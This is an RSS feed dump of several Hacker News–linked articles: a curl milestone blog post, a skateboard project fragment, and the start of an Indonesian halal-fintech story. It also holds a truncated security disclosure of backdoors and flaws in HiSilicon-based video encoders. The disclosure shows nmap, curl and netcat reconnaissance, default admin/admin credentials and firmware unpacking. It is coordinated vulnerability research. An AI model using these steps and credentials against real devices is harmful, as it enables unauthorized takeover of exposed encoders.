electric skateboard or mountainboard, go check out 3DServisas precision gear drives used by many production board makers such as <a href="https://www.bioboards.se/?utm_source=techprowd">BioBoards</a> and DIY players.</p><figure><a href="http://shop.3dservisas.eu/?utm_source=techprowd"><div><p>3DServisas Shop</p><p>CNC Machined goods</p><p><img src="http://cdn.shopify.com/s/files/1/2408/6975/files/3DServisas-logo-1_0_5x_150x150.png?v=1558443632"><span>3DServisas</span></p></div><p><img src="https://cdn.shopify.com/s/files/1/2408/6975/files/logo.png?height=628&amp;pad_color=fff&amp;v=1506788900&amp;width=1200"></p></a></figure><p>Instagram page: <a href="https://www.instagram.com/3dservisas/">https://www.instagram.com/3dservisas/</a></p><h2 id="announcement">Announcement</h2><p>I don't know if you have read my previous articles, but I have opened a Patreon account so you guys could help me by supporting my projects!</p><figure><a href="https://www.patreon.com/techprowd"><div><p>Techprowd is creating articles about software/electronics/cad and other DIY ideas | Patreon</p><p>Patreon is a membership platform that makes it easy for artists and creators to get paid. Join over 200,000 creators earning salaries from over 6 million monthly patrons.</p><p><img src="https://c5.patreon.com/external/favicon/apple-touch-icon.png?v=jw6AR4Rg74"><span>Patreon</span></p></div><p><img src="https://c10.patreonusercontent.com/3/eyJ3Ijo5NjB9/patreon-media/p/campaign/5333287/24fe815b9d214942af49618835ab1447/1.png?token-time=1601769600&amp;token-hash=d-6szlXLAeDC-Z1fx0vSdZvUw7AZpC7CEZ2uYFpFrNw%3D"></p></a></figure><p>If you are not interested in supporting, at least I suggest subscribing to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517767</guid>
            <pubDate>Fri, 18 Sep 2020 15:12:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15,000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24517595">thread link</a>) | @caution
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517595</guid>
            <pubDate>Fri, 18 Sep 2020 14:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backdoors and other vulnerabilities in HiSilicon based hardware video encoders]]>
            </title>
            <description>
<![CDATA[
Score 185 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24516453">thread link</a>) | @blablablub
<br/>
September 18, 2020 | https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>15 Sep 2020</span></p><p><img src="https://kojenov.com/assets/2020-09-15-encoders/010-title-bug.png" alt="bug"></p>

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<!--more-->

<ul id="markdown-toc">
  <li><a href="#summary" id="markdown-toc-summary">Summary</a></li>
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#hardware" id="markdown-toc-hardware">Hardware</a></li>
  <li><a href="#network-recon" id="markdown-toc-network-recon">Network recon</a>    <ul>
      <li><a href="#23---telnet" id="markdown-toc-23---telnet">23 - telnet</a></li>
      <li><a href="#80-8086---web-application" id="markdown-toc-80-8086---web-application">80, 8086 - web application</a></li>
      <li><a href="#554-8554---rtsp" id="markdown-toc-554-8554---rtsp">554, 8554 - RTSP</a></li>
      <li><a href="#1935---rtmp" id="markdown-toc-1935---rtmp">1935 - RTMP</a></li>
      <li><a href="#5150---serial-to-tcp" id="markdown-toc-5150---serial-to-tcp">5150 - serial to TCP</a></li>
      <li><a href="#9588---another-web-server" id="markdown-toc-9588---another-web-server">9588 - another web server</a></li>
    </ul>
  </li>
  <li><a href="#firmware-analysis" id="markdown-toc-firmware-analysis">Firmware analysis</a>    <ul>
      <li><a href="#content" id="markdown-toc-content">Content</a></li>
      <li><a href="#password-file-and-telnet-access" id="markdown-toc-password-file-and-telnet-access">Password file and telnet access</a></li>
    </ul>
  </li>
  <li><a href="#local-recon" id="markdown-toc-local-recon">Local recon</a>    <ul>
      <li><a href="#the-base-system" id="markdown-toc-the-base-system">The base system</a></li>
      <li><a href="#processes" id="markdown-toc-processes">Processes</a></li>
      <li><a href="#ports" id="markdown-toc-ports">Ports</a></li>
      <li><a href="#dumping-the-file-system" id="markdown-toc-dumping-the-file-system">Dumping the file system</a></li>
    </ul>
  </li>
  <li><a href="#reverse-engineering" id="markdown-toc-reverse-engineering">Reverse engineering</a>    <ul>
      <li><a href="#modifying-the-boot" id="markdown-toc-modifying-the-boot">Modifying the boot</a></li>
      <li><a href="#remote-debugging" id="markdown-toc-remote-debugging">Remote debugging</a></li>
      <li><a href="#decompiling" id="markdown-toc-decompiling">Decompiling</a></li>
    </ul>
  </li>
  <li><a href="#vulnerabilities-and-exploits" id="markdown-toc-vulnerabilities-and-exploits">Vulnerabilities and exploits</a>    <ul>
      <li><a href="#backdoor-password-cve-2020-24215" id="markdown-toc-backdoor-password-cve-2020-24215">Backdoor password (CVE-2020-24215)</a></li>
      <li><a href="#root-access-via-telnet-cve-2020-24218" id="markdown-toc-root-access-via-telnet-cve-2020-24218">root access via telnet (CVE-2020-24218)</a></li>
      <li><a href="#arbitrary-file-disclosure-via-path-traversal-cve-2020-24219" id="markdown-toc-arbitrary-file-disclosure-via-path-traversal-cve-2020-24219">Arbitrary file disclosure via path traversal (CVE-2020-24219)</a></li>
      <li><a href="#unauthenticated-file-upload-cve-2020-24217" id="markdown-toc-unauthenticated-file-upload-cve-2020-24217">Unauthenticated file upload (CVE-2020-24217)</a></li>
      <li><a href="#arbitrary-code-execution-by-uploading-malicious-firmware" id="markdown-toc-arbitrary-code-execution-by-uploading-malicious-firmware">Arbitrary code execution by uploading malicious firmware</a></li>
      <li><a href="#arbitrary-code-execution-via-command-injection" id="markdown-toc-arbitrary-code-execution-via-command-injection">Arbitrary code execution via command injection</a></li>
      <li><a href="#buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214" id="markdown-toc-buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214">Buffer overflow: definite DoS and potential RCE (CVE-2020-24214)</a></li>
      <li></li>
    </ul>
  </li>
  <li><a href="#disclosure" id="markdown-toc-disclosure">Disclosure</a>    <ul>
      <li><a href="#affected-vendors" id="markdown-toc-affected-vendors">Affected vendors</a></li>
      <li><a href="#coordinated-disclosure" id="markdown-toc-coordinated-disclosure">Coordinated disclosure</a></li>
      <li><a href="#remediation" id="markdown-toc-remediation">Remediation</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#exploit-demos" id="markdown-toc-exploit-demos">Exploit demos</a></li>
  <li><a href="#exploit-scripts" id="markdown-toc-exploit-scripts">Exploit scripts</a></li>
  <li><a href="#links" id="markdown-toc-links">Links</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>The following vulnerabilities were identified:</p>

<ul>
  <li>Critical
    <ul>
      <li>Full admin interface access via backdoor password (CVE-2020-24215)</li>
      <li>root access via telnet (CVE-2020-24218)</li>
      <li>Arbitrary file disclosure via path traversal (CVE-2020-24219)</li>
      <li>Unauthenticated file upload (CVE-2020-24217)
        <ul>
          <li>Arbitrary code execution via malicious firmware upload</li>
          <li>Arbitrary code execution via command injection</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>High
    <ul>
      <li>Denial of service via buffer overflow (CVE-2020-24214)</li>
    </ul>
  </li>
  <li>Medium
    <ul>
      <li>Unauthorized RTSP video stream access (CVE-2020-24216)</li>
    </ul>
  </li>
</ul>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I’ve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,…) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting “port knocking” backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<h2 id="hardware">Hardware</h2>

<p>Here is a few pictures of one of the devices I had an opportunity to test.
<img src="https://kojenov.com/assets/2020-09-15-encoders/050-encoder.jpg" alt="hardware">
Physical ports
<img src="https://kojenov.com/assets/2020-09-15-encoders/060-encoder.jpg" alt="hardware">
Top cover off. The right side, from top to bottom: LAN, HDMI out, reset, HDMI in, LEDs, audio in
<img src="https://kojenov.com/assets/2020-09-15-encoders/070-encoder.jpg" alt="hardware">
Let’s plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it’s enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588
HTTP/1.1 200 OK
Server: nginx/1.6.0
Date: Thu, 22 Mar 2018 14:28:13 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Wed, 05 Dec 2018 10:58:31 GMT
Connection: keep-alive
ETag: "5c07af57-264"
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
...
</code></pre></div></div>

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar
...
</code></pre></div></div>

<p>Here is the directory structure:</p>

<div><div><pre><code>$ tree -d
.
├── disk
├── ko
│   └── extdrv
├── lib
├── nginx
│   ├── conf
│   ├── html
│   ├── logs
│   └── sbin
└── web
    ├── css
    ├── images
    ├── js
    └── player
        └── icons
</code></pre></div></div>

<ul>
  <li><code>disk</code>: empty</li>
  <li><code>ko</code>: kernel modules (device drivers)</li>
  <li><code>lib</code>: empty</li>
  <li><code>nginx</code>: nginx executables and configuration</li>
  <li><code>web</code>: static content (html, js, css…)</li>
</ul>

<p>The most important things are in the root of the archive:</p>

<div><div><pre><code>$ ls -l
total 12756
-rw------- 1 root root     307 Jul 14 08:31 box.ini
-rw------- 1 root root 6533364 Jul 14 08:31 box.v400_hdmi
drwx------ 2 root root    4096 Jul 14 08:31 disk
-rw------- 1 root root 2972924 Jul 14 08:31 font.ttf
-rw------- 1 root root 1570790 Jul 14 08:31 hostapd
-rw------- 1 root root    1847 Jul 14 08:31 hostapd.conf
drwx------ 3 root root    4096 Jul 14 08:31 ko
drwx------ 2 root root    4096 Jul 14 08:31 lib
drwx------ 6 root root    4096 Jul 14 08:31 nginx
-rw------- 1 root root 1382400 Jul 14 08:31 nosig.yuv
-rw------- 1 root root      38 Jul 14 08:31 passwd
-rw------- 1 root root  211248 Jul 14 08:31 png2bmp
-rw------- 1 root root   19213 Jul 14 08:30 remserial
-rw------- 1 root root    6624 Jul 14 08:30 reset
-rw------- 1 root root     968 Jul 14 08:30 run
-rw------- 1 root root     878 Jul 14 08:30 udhcpc.script
-rw------- 1 root root     191 Jul 14 08:30 udhcpd.conf
drwx------ 6 root root    4096 Jul 14 08:31 web
-rw------- 1 root root   39166 Jul 14 08:31 wpa_cli
-rw------- 1 root root  264069 Jul 14 08:31 wpa_supplicant
</code></pre></div></div>

<p>In addition to some general utilities ( <code>hostapd</code>, <code>png2bmp</code>, <code>remserial</code>, <code>wpa_cli</code>, <code>wpa_supplicant</code>) it contains the custom web application <code>box.v400_hdmi</code> which is a compiled binary:</p>

<div><div><pre><code>$ file box.v400_hdmi 
box.v400_hdmi: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
</code></pre></div></div>

<p><strong>This executable is the primary target of my research, and …</strong></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</a></em></p>]]>
            </description>
            <link>https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516453</guid>
            <pubDate>Fri, 18 Sep 2020 13:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital banking, now halal]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24516141">thread link</a>) | @jbegley
<br/>
September 18, 2020 | https://restofworld.org/2020/now-serving-halal-apps/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/now-serving-halal-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia’s 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council’s influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




